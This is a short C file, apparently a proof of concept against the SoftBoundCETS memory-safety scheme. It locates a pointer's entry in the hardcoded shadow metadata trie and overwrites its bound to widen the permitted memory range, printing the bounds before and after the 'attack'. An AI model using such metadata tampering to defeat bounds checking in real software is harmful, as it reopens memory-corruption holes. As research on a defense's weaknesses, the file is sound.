#include "uninstr.h"
#include <stdlib.h>
#include <stdio.h>

typedef struct {
    void *base;
    void *bound;
    size_t key;
    size_t *lock;
} __shadow_softboundcets_metadata_t;

static __shadow_softboundcets_metadata_t** PRIMARY_TRIE_TABLE = 0x7FFFD3C00000;

void log_metadata_changes(__shadow_softboundcets_metadata_t *entry, int after_attack)
{
    char *msg;
    if (after_attack)
    {
        msg = "New";
    } else
    {
        msg = "Original";
    }

    printf("%s entry provides the following privilege:\
        \n    base : %p\
        \n    bound : %p\
        \n    ( total of %d bytes )\
        \n\n",
        msg,
        entry->base,
        entry->bound, 
        entry->bound - entry->base
    );
}


void overwrite_metadata_map(void *addr_of_ptr, int array_len)
{
    // get entry for `addr_of_ptr` from metadata table
    size_t ptr = (size_t)addr_of_ptr;
    size_t primary_index = (ptr >> 25);
    __shadow_softboundcets_metadata_t *secondary_trie_table = *(PRIMARY_TRIE_TABLE + primary_index);
    size_t secondary_index = ((ptr >> 3) & 0x3fffff);
    __shadow_softboundcets_metadata_t *entry = &(*(secondary_trie_table + secondary_index));

    // log original privilege
    log_metadata_changes(entry, 0);

    // extend privilege by just 4 bytes
    entry->bound = entry->base + ((array_len + 1) * sizeof(int));

    // log modified privilege
    log_metadata_changes(entry, 1);
}

